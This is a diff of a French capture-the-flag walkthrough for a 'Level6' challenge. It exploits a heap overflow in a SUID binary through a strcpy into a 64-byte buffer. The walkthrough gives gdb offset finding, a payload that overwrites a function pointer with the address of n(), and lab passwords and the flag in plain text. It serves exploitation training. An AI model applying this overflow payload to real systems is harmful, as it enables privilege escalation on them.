@@ -1,134 +1,100 @@
 # Level6 - Walkthrough
 
 ## Objectif
-Utiliser un buffer overflow sur le heap pour overwriter un pointeur de fonction et exécuter la fonction `n()` qui affiche le flag de level7.
+Exploiter un heap buffer overflow pour écraser un pointeur de fonction et exécuter `n()` qui affiche le flag.
+
+**Technique** : Heap Overflow + Function Pointer Overwrite
 
 ---
 
-## Étape 1 : Connexion
+## Étapes d'exploitation
 
-```bash
-ssh level6@localhost -p 4242
-# Mot de passe : d3b7bf1025544a6d95147b7b5b3f36f31f333db3
-```
-
----
-
-## Étape 2 : Reconnaissance
-
+### 1. Reconnaissance
 ```bash
 ls -la
+# -rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
+# ⚠️ Bit SUID actif → s'exécute avec les droits de level7
+
 ./level6
-# Segmentation fault (sans arguments)
+# Segmentation fault
 
 ./level6 test
 # Nope
 ```
 
-Le programme nécessite un argument.
-
----
-
-## Étape 3 : Identifier la vulnérabilité
-
-Analyser le binaire dans Ghidra :
+### 2. Analyse du code (Ghidra)
 
 ```c
-void main(undefined4 param_1, int param_2)
-{
-  char *__dest;
-  undefined4 *puVar1;
-  
-  __dest = malloc(0x40);                    // Alloue 64 bytes
-  puVar1 = malloc(4);                       // Alloue 4 bytes
-  *puVar1 = m;                              // puVar1 pointe vers m()
-  strcpy(__dest, *(char **)(param_2 + 4)); // BUFFER OVERFLOW !
-  (*(code *)*puVar1)();                     // Exécute la fonction
-  return;
-}
+void m(void) { puts("Nope"); }
 
-void m(void *param_1, int param_2, char *param_3, int param_4, int param_5)
-{
-  puts("Nope");
-  return;
-}
+void n(void) { system("/bin/cat /home/user/level7/.pass"); }
 
-void n(void)
-{
-  system("/cat /home/user/level7/.pass");
-  return;
+int main(int argc, char **argv) {
+    char *dest     = malloc(64);  // Bloc 1
+    void (*func_ptr)(void) = malloc(4);   // Bloc 2 (adjacent !)
+
+    *func_ptr = m;           // func_ptr pointe vers m()
+    strcpy(dest, argv[1]);   // ⚠️ Pas de vérification de taille !
+    (*func_ptr)();           // Appelle la fonction pointée
 }
 ```
 
-**La vulnérabilité :** `strcpy()` sans limite + heap overflow.
+**Stratégie** : Overflow `dest` pour écraser `func_ptr` avec l'adresse de `n()`.
 
-**Stratégie :** Overwriter `puVar1` (qui contient l'adresse de `m()`) avec l'adresse de `n()`.
-
----
-
-## Étape 4 : Trouver les adresses critiques
-
-### Adresse de `n()`
+### 3. Trouver l'adresse de `n()`
 
 ```bash
-objdump -t level6 | grep " n"
+# Dans Ghidra → cliquer sur n()
+# Adresse : 0x08048454
+
+# Ou avec objdump :
+objdump -t level6 | grep " n$"
+# 08048454 g     F .text  n
 ```
 
-Ou dans Ghidra, hover sur `n()` :
+### 4. Déterminer l'offset
 
-```
-n() @ 0x08048454
-```
-
----
-
-## Étape 5 : Trouver l'offset du heap overflow
-
-Tester progressivement :
-
+#### Pattern cyclique
 ```bash
-./level6 $(python -c 'print "A"*64 + "BBBB"')
-# Segmentation fault
+gdb level6
+(gdb) run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"')
 
-./level6 $(python -c 'print "A"*72 + "BBBB"')
-# Segmentation fault
-
-./level6 $(python -c 'print "A"*6 + "BBBB"')
-# Nope (trop peu)
-
-./level6 $(python -c 'print "A"*72 + "CCCC"')
-# Segmentation fault (mauvaise adresse)
+Program received signal SIGSEGV
+(gdb) info registers eip
+# eip = 0x63413663 → chercher dans le pattern → position 72
 ```
 
-**L'offset est 72 bytes** (64 bytes de `__dest` + 8 bytes de padding du heap).
-
----
-
-## Étape 6 : Construction du payload
-
-Structure :
-- `A` * 72 = Remplit `__dest` et le padding/metadata du heap
-- `\x54\x84\x04\x08` = Adresse de `n()` en little-endian (écrase le pointeur dans `puVar1`)
-
-Payload :
+#### Vérification
 ```bash
-./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+(gdb) run $(python -c 'print "A"*72 + "BBBB"')
+(gdb) info registers eip
+# eip = 0x42424242 → "BBBB" ✅
 ```
 
----
+**Offset = 72 bytes** (64 buffer + 8 header malloc)
 
-## Étape 7 : Exploitation
+### 5. Construction du payload
+
+**Conversion de l'adresse en little-endian** :
+```
+0x08048454 → \x54\x84\x04\x08
+```
+
+**Structure** :
+```
+['A' × 72] + [adresse de n()]
+     ↓               ↓
+  Remplit dest    Écrase func_ptr
+  + header malloc
+```
+
+### 6. Exploitation
 
 ```bash
 ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
 ```
 
-Au lieu d'exécuter `m()` qui affiche "Nope", le programme exécute `n()` qui affiche le flag.
-
-```bash
-su level7
-# Mot de passe : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-```
+**Résultat** : Le flag s'affiche directement.
 
 ---
 
@@ -136,3 +102,8 @@ su level7
 ```
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
+
+## Type de vulnérabilité
+- Heap-based Buffer Overflow (CWE-122)
+- Function Pointer Overwrite
+- SUID privilege escalation (CWE-250)
